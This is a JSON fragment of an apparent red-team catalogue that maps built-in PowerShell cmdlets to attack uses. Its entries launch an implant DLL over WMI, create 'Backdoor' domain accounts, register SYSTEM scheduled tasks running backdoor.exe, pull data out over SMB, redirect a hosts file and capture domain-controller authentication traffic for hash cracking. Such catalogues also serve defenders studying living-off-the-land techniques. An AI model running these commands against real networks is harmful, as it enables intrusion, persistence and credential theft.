"Type":"Cmdlets","Name":"Invoke-CimMethod","Description":"Invokes a method of a CIM class","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-CimInstance -Namespace root/CIMV2/TerminalServices -ClassName Win32_TerminalServiceSetting | Invoke-CimMethod -MethodName SetAllowTSConnections -Arguments @{AllowTSConnections=1; ModifyFirewallException=1}","Description":"Invoke a method on a CIM instance","Usecases":["Enable Remote Desktop Services"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `CimCmdlets`"],"MitreAttack":["T1047"]},{"Command":"Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"Shadow\"; uValue=[uint32]2} -CimSession $s","Description":"Invoke a static method on a CIM class","Usecases":["Set registry value"],"Function":"Registry","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `CimCmdlets`"],"MitreAttack":["T1112"]},{"Command":"Invoke-CimMethod -ClassName Win32_Process -Name Create -Arguments @{CommandLine='C:\\Windows\\System32\\rundll32.exe \"C:\\tmp\\App Folder\\beacon.dll\",Start'} -CimSession $s","Description":"Invoke a static method on a CIM class","Usecases":["Launch implant"],"Function":"Execute","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `CimCmdlets`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Invoke-CimMethod/"},{
"Type":"Cmdlets","Name":"Invoke-Command","Description":"Runs commands on local and remote computers","Updated":"2023-07-01","Toolsets":["Builtin","PSSession"],"Commands":[{"Command":"Invoke-Command -ComputerName W10.ad.bitsadmin.com { Get-NetAdapter }","Description":"Runs command","Usecases":null,"Function":"Execute","Comments":["Create PSSession `$ps` using [New-PSSession](../New-PSSession/)","PowerShell Module: `Microsoft.PowerShell.Core`"],"MitreAttack":["T1021.006","T1059.001"]},{"Command":"Invoke-Command -Session $ps { Get-NetAdapter }","Description":"Runs command","Usecases":null,"Function":"Execute","Comments":["Create PSSession `$ps` using [New-PSSession](../New-PSSession/)","PowerShell Module: `Microsoft.PowerShell.Core`"],"MitreAttack":["T1021.006","T1059.001"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Invoke-Command/"},{
"Type":"Cmdlets","Name":"Invoke-WSManAction","Description":"Invokes an action on the object that is specified by the Resource URI and by the selectors","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"Invoke-WSManAction -ComputerName W10.ad.bitsadmin.com -Action \"Create\" -ResourceURI wmicimv2/win32_process -ValueSet @{CommandLine='C:\\Windows\\System32\\rundll32.exe \"C:\\tmp\\App Folder\\beacon.dll\",Start'}","Description":"Execute binary","Usecases":["Launch implant"],"Function":"Execute","Comments":["PowerShell Module: `Microsoft.WSMan.Management`"],"MitreAttack":["T1047","T1059.001"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Invoke-WSManAction/"},{
"Type":"Cmdlets","Name":"Mount-DiskImage","Description":"Mounts a previously created disk image (virtual hard disk or ISO), making it appear as a normal disk","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Mount-DiskImage -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Mount-DiskImage/"},{
"Type":"Cmdlets","Name":"Move-Item","Description":"Moves an item from one location to another","Updated":"2023-07-01","Toolsets":["Builtin","PSSession"],"Commands":[{"Command":"Move-Item -Path \\\\FS01.ad.bitsadmin.com\\Users\\AllUsers.zip .","Description":"Exfiltrate data","Usecases":["Exfiltrate data over SMB"],"Function":"Data","Comments":["Create PSSession `$ps` using [New-PSSession](../New-PSSession/)","PowerShell Module: `Microsoft.PowerShell.Management`"],"MitreAttack":["T1021.002"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Move-Item/"},{
"Type":"Cmdlets","Name":"New-ADComputer","Description":"Creates a new Active Directory computer","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"$account = 'MyComputer'\n$password = 'Password1!'\n$domain = 'ad.bitsadmin.com'\nNew-ADComputer -Name $account -SAMAccountName $account -AccountPassword (ConvertTo-SecureString $password -Force -AsPlainText) -Verbose -DNSHostName \"$account.$domain\" -ServicePrincipalNames @(\"HOST/$account.$domain\",\"RestrictedKrbHost/$account.$domain\",\"HOST/$account\",\"RestrictedKrbHost/$account\")\n","Description":"Create computer account","Usecases":["Create backdoor user in the AD"],"Function":"Domain","Comments":["Can be performed by a regular user","By default the attribute `ms-DS-MachineAccountQuota` (global setting) is set to 10 for all domain users","PowerShell Module: `ActiveDirectory`"],"MitreAttack":["T1136.002"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-ADComputer/"},{
"Type":"Cmdlets","Name":"New-ADGroup","Description":"Creates an Active Directory group","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"New-ADGroup","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-ADGroup/"},{
"Type":"Cmdlets","Name":"New-ADObject","Description":"Creates an Active Directory object","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"New-ADObject","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-ADObject/"},{
"Type":"Cmdlets","Name":"New-ADOrganizationalUnit","Description":"Creates a new Active Directory organizational unit","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"New-ADOrganizationalUnit -Name GPO_Test -Path \"OU=Azure,OU=Servers,DC=ad,DC=bitsadmin,DC=com\"","Description":"Create new OU","Usecases":["Create new OU for a simulated ransomware attack"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-ADOrganizationalUnit/"},{
"Type":"Cmdlets","Name":"New-ADServiceAccount","Description":"Creates a new Active Directory managed service account or group managed service account object","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"New-ADServiceAccount","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":["T1136.002"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-ADServiceAccount/"},{
"Type":"Cmdlets","Name":"New-ADUser","Description":"Creates a new Active Directory user","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"New-ADUser -Name \"Backdoor\" -AccountPassword (ConvertTo-SecureString \"MyPassword!\" -Force -AsPlainText) -Enabled $true","Description":"Create new user","Usecases":["Create backdoor user in the AD"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":["T1136.002"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-ADUser/"},{
"Type":"Cmdlets","Name":"New-CimInstance","Description":"Creates a CIM instance","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"New-CimInstance -ClassName Win32_Environment -Property @{Name=\"testvar\";VariableValue=\"testvalue\";UserName=\"<SYSTEM>\"} -CimSession $s","Description":"Create new instance","Usecases":["Change PATH environment variable for search order hijacking"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `CimCmdlets`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-CimInstance/"},{
"Type":"Cmdlets","Name":"New-CimSession","Description":"Creates a CIM session","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"$s = New-CimSession -ComputerName W10.ad.bitsadmin.com","Description":"Creates a CIM session over WinRM","Usecases":["Connect to remote machine to perform activities using the various WMI classes"],"Function":"Manage","Comments":["There are various other options for the `-Authentication` parameter that can be used"],"MitreAttack":["T1047","T1021.006"]},{"Command":"$so = New-CimSessionOption -Protocol Dcom -Authentication Kerberos\n$s = New-CimSession -ComputerName W10.ad.bitsadmin.com -SessionOption $so\n","Description":"Creates a CIM session over RPC","Usecases":["Connect to remote machine to perform activities using the various WMI classes"],"Function":"Manage","Comments":["There are various other options for the `-Authentication` parameter that can be used"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-CimSession/"},{
"Type":"Cmdlets","Name":"New-EtwTraceSession","Description":"Creates an ETW trace session","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"New-EtwTraceSession -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `EventTracingManagement`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-EtwTraceSession/"},{
"Type":"Cmdlets","Name":"New-GPLink","Description":"Links a GPO to a site, domain, or OU","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"New-GPLink","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `GroupPolicy`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-GPLink/"},{
"Type":"Cmdlets","Name":"New-GPO","Description":"Creates a GPO","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"New-GPO -Name RunImmediateScheduledTask","Description":"Create new GPO","Usecases":["Create new GPO which runs an immediate scheduled task to deploy an implant on the computers in the OU it is linked to"],"Function":"Domain","Comments":["PowerShell Module: `GroupPolicy`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-GPO/"},{
"Type":"Cmdlets","Name":"New-NetEventSession","Description":"Creates a network event session","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"New-NetEventSession -Name sess -CimSession $s -LocalFilePath \"C:\\Windows\\Temp\\Trace.etl\" -CaptureMode SaveToFile\nAdd-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical\nStart-NetEventSession -Name sess -CimSession $s\nGet-NetEventSession -Name sess -CimSession $s\n\nStop-NetEventSession -Name sess -CimSession $s\nRemove-NetEventSession -Name sess -CimSession $s\nMove-Item \\\\DC1.ad.bitsadmin.com\\C$\\Windows\\Temp\\Trace.etl C:\\tmp\n","Description":"Sniff traffic","Usecases":["Sniff authentication traffic on a domain controller and locally crack the hashes"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Convert resulting `.etl` file to `.pcapng` using `etl2pcapng`","PowerShell Module: `NetEventPacketCapture`"],"MitreAttack":["T1047"]}],"Resources":["https://github.com/microsoft/etl2pcapng"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-NetEventSession/"},{
"Type":"Cmdlets","Name":"New-NetFirewallRule","Description":"Creates a new inbound or outbound firewall rule and adds the rule to the target computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"New-NetFirewallRule -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `netsecurity`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-NetFirewallRule/"},{
"Type":"Cmdlets","Name":"New-NetNat","Description":"Creates a NAT object","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"New-NetNat -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-NetNat/"},{
"Type":"Cmdlets","Name":"New-NetRoute","Description":"Creates a route in the IP routing table","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"New-NetRoute -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetTCPIP`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-NetRoute/"},{
"Type":"Cmdlets","Name":"New-PSSession","Description":"Creates a persistent connection to a local or remote computer","Updated":"2023-08-25","Toolsets":["Builtin","PSSession"],"Commands":[{"Command":"$ps = New-PSSession -ComputerName W10.ad.bitsadmin.com","Description":"Connect to WinRM","Usecases":null,"Function":"Execute","Comments":["Next, for example use [Enter-PSSession](../Enter-PSSession) to interactively enter the session or [Invoke-Command](../Invoke-Command) to execute a command in the session"],"MitreAttack":["T1021.006"]},{"Command":"$ps = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exch2019.ad.bitsadmin.com/PowerShell/ -Authentication Kerberos","Description":"Manage Microsoft Exchange Server","Usecases":null,"Function":"Manage","Comments":["Might require use of OffensiveDC in case error `ERROR_WSMAN_CLIENT_WORKGROUP_NO_KERBEROS` is returned on a non-domain joined machine"],"MitreAttack":["T1021.006"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-PSSession/"},{
"Type":"Cmdlets","Name":"New-ScheduledTask","Description":"Creates a scheduled task instance","Updated":"2024-12-13","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"$a = New-ScheduledTaskAction -Execute \"C:\\Tmp\\backdoor.exe\" -Argument '-background'\n$p = New-ScheduledTaskPrincipal -UserId \"NT Authority\\SYSTEM\"\n$ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8\n$d = New-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss\n$t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d\n","Description":"Create new scheduled task","Usecases":null,"Function":"Execute","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","See [Register-ScheduledTask](../Register-ScheduledTask)","PowerShell Module: `ScheduledTasks`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-ScheduledTask/"},{
"Type":"Cmdlets","Name":"New-SmbShare","Description":"Creates an SMB share","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"New-SmbShare -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `SmbShare`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-SmbShare/"},{
"Type":"Cmdlets","Name":"New-VirtualDisk","Description":"Creates a new virtual disk in the specified storage pool","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"New-VirtualDisk -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-VirtualDisk/"},{
"Type":"Cmdlets","Name":"New-VirtualDiskSnapshot","Description":"Creates a new snapshot of the specified virtual disk","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"New-VirtualDiskSnapshot -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-VirtualDiskSnapshot/"},{
"Type":"Cmdlets","Name":"New-WSManInstance","Description":"Creates a new instance of a management resource","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"New-WSManInstance","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["PowerShell Module: `Microsoft.WSMan.Management`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/New-WSManInstance/"},{
"Type":"Cmdlets","Name":"Out-File","Description":"Sends output to a file","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"\"10.0.10.123 legit.com\" | Out-File -Append \\\\W10.ad.bitsadmin.com\\C$\\Windows\\System32\\Drivers\\etc\\hosts -Encoding ascii","Description":"Append line to file","Usecases":["Add name to target host file to point to a malicious IP"],"Function":"Data","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Out-File/"},{
"Type":"Cmdlets","Name":"Publish-DscConfiguration","Description":"Publishes a DSC configuration to a set of computers","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"Publish-DscConfiguration","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["PowerShell Module: `PSDesiredStateConfiguration`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Publish-DscConfiguration/"},{
"Type":"Cmdlets","Name":"Register-CimIndicationEvent","Description":"Subscribes to indications using a filter expression or a query expression","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Register-CimIndicationEvent -CimSession $s","Description":"TODO","Usecases":null,"Function":"Execute","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `CimCmdlets`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Register-CimIndicationEvent/"},{
"Type":"Cmdlets","Name":"Register-ScheduledTask","Description":"Registers a scheduled task definition on a local computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"$a = New-ScheduledTaskAction -Execute \"C:\\Tmp\\backdoor.exe\" -Argument '-background'\n$p = New-ScheduledTaskPrincipal -UserId \"NT Authority\\SYSTEM\"\n$ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8\nNew-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss\n$t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d\n","Description":"Create new scheduled task","Usecases":["Persistence"],"Function":"Execute","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `ScheduledTasks`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Register-ScheduledTask/"},{
"Type":"Cmdlets","Name":"Remove-ADUser","Description":"Removes an Active Directory user","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Remove-ADUser","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Remove-ADUser/"},{
"Type":"Cmdlets","Name":"Remove-DhcpServerv4Lease","Description":"Deletes the specified IPv4 address lease record from the Dynamic Host Configuration Protocol (DHCP) server service","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Remove-DhcpServerv4Lease -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DhcpServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Remove-DhcpServerv4Lease/"},{
"Type":"Cmdlets","Name":"Remove-FileShare","Description":"Removes a file share","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Remove-FileShare -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Remove-FileShare/"},{
"Type":"Cmdlets","Name":"Remove-MpPreference","Description":"Removes exclusions or default actions","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Remove-MpPreference -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Defender`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Remove-MpPreference/"},{
"Type":"Cmdlets","Name":"Remove-MpThreat","Description":"Removes active threats from a computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Remove-MpThreat -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Defender`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Remove-MpThreat/"},{
"Type":"Cmdlets","Name":"Remove-NetEventSession","Description":"Removes a network event session","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Remove-NetEventSession -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetEventPacketCapture`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Remove-NetEventSession/"},{
"Type":"Cmdlets","Name":"Remove-NetNat","Description":"Removes NAT objects","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Remove-NetNat -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Remove-NetNat/"},{
"Type":"Cmdlets","Name":"Remove-NetNatExternalAddress","Description":"Removes an external address from a NAT instance","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Remove-NetNatExternalAddress -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Remove-NetNatExternalAddress/"},{
"Type":"Cmdlets","Name":"Remove-NetNatStaticMapping","Description":"Removes static mappings from a NAT instance","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Remove-NetNatStaticMapping -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Remove-NetNatStaticMapping/"},{
"Type":"Cmdlets","Name":"Remove-SmbShare","Description":"Deletes the specified SMB shares","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Remove-SmbShare -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `SmbShare`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Remove-SmbShare/"},{
"Type":"Cmdlets","Name":"Remove-VirtualDisk","Description":"Deletes an existing virtual disk and reclaims the used space for use by other virtual disks in the same storage pool","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Remove-VirtualDisk -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Remove-VirtualDisk/"},{
"Type":"Cmdlets","Name":"Rename-ADObject","Description":"Changes the name of an Active Directory object","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Rename-ADObject","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Rename-ADObject/"},{
"Type":"Cmdlets","Name":"Resolve-DnsName","Description":"Performs a DNS name query resolution for the specified name","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"Resolve-DnsName -Type SRV _kerberos._tcp.ad.bitsadmin.com","Description":"Identify servers in the domain","Usecases":["Identify Kerberos Key Distribution Center service"],"Function":"Network","Comments":["Various other queries available to identify servers at the resources link","PowerShell Module: `DnsClient`"],"MitreAttack":["T1590.002"]}],"Resources":["https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7fcdce70-5205-44d6-9c3a-260e616a2f04"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Resolve-DnsName/"},{
